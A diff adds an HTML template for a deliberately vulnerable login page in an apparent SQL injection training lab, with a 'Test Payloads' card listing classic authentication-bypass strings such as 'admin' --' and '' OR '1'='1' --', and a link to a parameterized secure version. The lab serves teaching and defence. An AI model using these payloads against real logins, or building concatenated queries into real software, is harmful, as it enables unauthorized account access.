@@ -1,0 +1,76 @@
+{% extends "base.html" %}
+
+{% block title %}Login - SQL Injection Lab{% endblock %}
+
+{% block content %}
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">🔐 Login</span>
+        <span class="badge badge-danger">Vulnerable: Classic SQLi</span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">
+        This login form is vulnerable to <strong>Classic SQL Injection (Authentication Bypass)</strong>.
+        The username and password are directly concatenated into the SQL query without parameterization.
+    </p>
+    {% if error %}
+        <div class="alert alert-danger">{{ error }}</div>
+    {% endif %}
+    {% if result %}
+        <div class="alert alert-success">
+            <strong>Login Successful!</strong><br>
+            User: {{ result.username }} | Role: {{ result.role }} | ID: {{ result.id }}
+        </div>
+    {% endif %}
+    <form method="POST" action="{{ url_for('login') }}">
+        <div class="form-group">
+            <label>Username</label>
+            <input type="text" name="username" placeholder="Enter username" required>
+        </div>
+        <div class="form-group">
+            <label>Password</label>
+            <input type="password" name="password" placeholder="Enter password" required>
+        </div>
+        <button type="submit" class="btn btn-primary">Login</button>
+    </form>
+    {% if executed_query %}
+    <div class="query-box">
+        <span class="label">Executed SQL Query</span>
+        <code>{{ executed_query }}</code>
+    </div>
+    {% endif %}
+</div>
+
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">💉 Test Payloads</span>
+        <span class="badge badge-warning">Click to copy</span>
+    </div>
+    <div class="payload">
+        <div class="payload-label">Authentication Bypass (comment out password check)</div>
+        admin' --
+    </div>
+    <div class="payload">
+        <div class="payload-label">Universal True Condition</div>
+        ' OR '1'='1' --
+    </div>
+    <div class="payload">
+        <div class="payload-label">Login as first user (usually admin)</div>
+        ' OR '1'='1' LIMIT 1 --
+    </div>
+    <div class="payload">
+        <div class="payload-label">Bypass with OR in both fields</div>
+        Username: admin' OR '1'='1<br>Password: anything
+    </div>
+</div>
+
+<div class="card" style="border-color: var(--success);">
+    <div class="card-header">
+        <span class="card-title" style="color: var(--success);">🛡️ Secure Version</span>
+        <a href="{{ url_for('secure_login') }}" class="btn btn-outline" style="font-size: 12px; padding: 6px 12px;">Try Secure Login →</a>
+    </div>
+    <p style="color: var(--text-muted); font-size: 13px;">
+        The secure version uses parameterized queries with <code>?</code> placeholders, 
+        ensuring user input is always treated as data, never as executable SQL code.
+    </p>
+</div>
+{% endblock %}
